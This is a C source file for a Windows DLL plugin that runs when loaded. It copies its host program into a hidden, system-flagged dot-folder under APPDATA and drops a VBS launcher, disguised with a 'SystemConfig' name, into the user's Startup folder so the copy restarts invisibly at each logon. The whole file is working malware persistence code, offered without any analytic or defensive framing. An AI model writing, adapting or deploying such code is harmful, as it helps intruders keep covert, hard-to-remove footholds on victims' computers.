// persist_startup_folder.c - plugin that copies the binary to a hidden APPDATA folder and
// installs a Startup folder launcher script.
#include <windows.h>
#include <stdio.h>
#include <string.h>

#ifndef PATH_BUF_LEN
#define PATH_BUF_LEN 4096
#endif

static BOOL create_hidden_binary(char *hidden_binary, size_t hidden_binary_size, const char *bin_path, const char *bin_name) {
    char appdata[PATH_BUF_LEN];
    if (!GetEnvironmentVariableA("APPDATA", appdata, PATH_BUF_LEN)) {
        return FALSE;
    }

    char rand_str[9];
    snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
    char search_path[PATH_BUF_LEN];
    snprintf(search_path, PATH_BUF_LEN, "%s\\.*", appdata);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search_path, &findData);
    int dot_folder_count = 0;
    char existing_folder[PATH_BUF_LEN] = "";
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    dot_folder_count++;
                    if (dot_folder_count == 1) {
                        snprintf(existing_folder, PATH_BUF_LEN, "%s\\%s", appdata, findData.cFileName);
                    }
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    char hidden_folder[PATH_BUF_LEN];
    if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
        strncpy(hidden_folder, existing_folder, PATH_BUF_LEN);
    } else {
        snprintf(hidden_folder, PATH_BUF_LEN, "%s\\.%.8s", appdata, rand_str);
        if (!CreateDirectoryA(hidden_folder, NULL)) {
            return FALSE;
        }
    }
    SetFileAttributesA(hidden_folder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    snprintf(hidden_binary, hidden_binary_size, "%s\\%s", hidden_folder, bin_name);
    if (!CopyFileA(bin_path, hidden_binary, FALSE)) {
        return FALSE;
    }
    SetFileAttributesA(hidden_binary, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule; (void)lpReserved;
    if (ul_reason_for_call != DLL_PROCESS_ATTACH) {
        return TRUE;
    }

    char bin_path[PATH_BUF_LEN];
    if (!GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN)) return TRUE;
    char *bin_name = strrchr(bin_path, '\\');
    bin_name = bin_name ? bin_name + 1 : bin_path;

    char hidden_binary[PATH_BUF_LEN];
    if (!create_hidden_binary(hidden_binary, PATH_BUF_LEN, bin_path, bin_name)) return TRUE;

    char appdata_vbs[PATH_BUF_LEN];
    if (!GetEnvironmentVariableA("APPDATA", appdata_vbs, PATH_BUF_LEN)) return TRUE;

    char startup_folder[PATH_BUF_LEN];
    snprintf(startup_folder, PATH_BUF_LEN, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata_vbs);
    CreateDirectoryA(startup_folder, NULL);

    char vbs_path[PATH_BUF_LEN];
    char rand_str_vbs[9];
    snprintf(rand_str_vbs, sizeof(rand_str_vbs), "%08lx", GetTickCount());
    char hidden_service[32];
    snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str_vbs);
    snprintf(vbs_path, PATH_BUF_LEN, "%s\\%.8s.vbs", startup_folder, hidden_service);

    char vbs_content[1024];
    snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);

    HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return TRUE;
    DWORD bytesWritten;
    WriteFile(hFile, vbs_content, (DWORD)strlen(vbs_content), &bytesWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}
